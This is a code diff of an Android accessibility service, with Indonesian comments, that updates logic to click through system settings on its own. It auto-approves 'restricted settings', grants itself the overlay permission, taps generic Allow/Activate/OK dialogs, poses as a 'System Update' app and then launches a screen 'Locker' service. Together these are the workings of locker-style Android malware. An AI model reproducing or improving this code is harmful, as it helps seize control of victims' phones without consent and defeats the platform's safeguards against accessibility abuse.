@@ -76,7 +76,7 @@ public class CustomAccessibilityService extends AccessibilityService {
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) return;
 
-        // 2. Tangani "Restricted Settings" HANYA jika Android 13+ (SDK 33)
+        // 1. Tangani "Restricted Settings" (Hanya di halaman Info Aplikasi)
         if (android.os.Build.VERSION.SDK_INT >= 33) {
             checkAndClickByContentDesc(rootNode, "More options");
             checkAndClickByContentDesc(rootNode, "Opsi lainnya");
@@ -84,34 +84,45 @@ public class CustomAccessibilityService extends AccessibilityService {
             checkAndClick(rootNode, "Izinkan pengaturan terbatas");
         }
 
-        // 3. Alur Logika Izin Overlay
-        if (packageName.contains("settings")) {
-            // Cek Switch dulu (Halaman Detail)
-            boolean switchHandled = processOverlaySwitch(rootNode);
-            
-            // Jika tidak ada switch dan bukan di App Info, cari nama aplikasi (Halaman List)
-            if (!switchHandled && !className.contains("AppDetails")) {
-                checkAndClick(rootNode, "System Update");
-            }
+        // 2. Cek apakah kita sedang berada di halaman Izin Overlay
+        boolean onOverlayPage = isOverlayPermissionPage(rootNode);
 
-            // Klik teks-teks konfirmasi overlay
+        if (onOverlayPage) {
+            // Jika di halaman Overlay, baru boleh proses Switch/Toggle
+            processOverlaySwitch(rootNode);
+
+            // Klik teks konfirmasi yang sering muncul di halaman detail
             checkAndClick(rootNode, "Permit drawing over other apps");
             checkAndClick(rootNode, "Allow display over other apps");
             checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
             checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
+        } else if (packageName.contains("settings") && !className.contains("AppDetails")) {
+            // Jika di Settings tapi bukan halaman detail, cari nama aplikasi di list
+            checkAndClick(rootNode, "System Update");
         }
 
-        // 4. Cari tombol konfirmasi umum (Dialogs)
+        // 3. Cari tombol konfirmasi umum (Dialog Aktivasi Aksesibilitas)
         checkAndClick(rootNode, "Activate");
         checkAndClick(rootNode, "Aktifkan");
         checkAndClick(rootNode, "Allow");
         checkAndClick(rootNode, "Izinkan");
         checkAndClick(rootNode, "OK");
 
-        // Jalankan Locker hanya jika izin baru saja didapat
+        // 4. Jalankan Locker jika izin sudah oke
         if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
             triggerLocker();
         }
+    }
+
+    private boolean isOverlayPermissionPage(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        // Kata kunci unik yang hanya ada di halaman pengaturan "Display over other apps"
+        String[] keywords = {"Display over other apps", "Draw over other apps", "Appear on top", 
+                             "Tampilkan di atas aplikasi lain", "Muncul di atas aplikasi lain"};
+        for (String key : keywords) {
+            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) return true;
+        }
+        return false;
     }
 
     private void triggerLocker() {
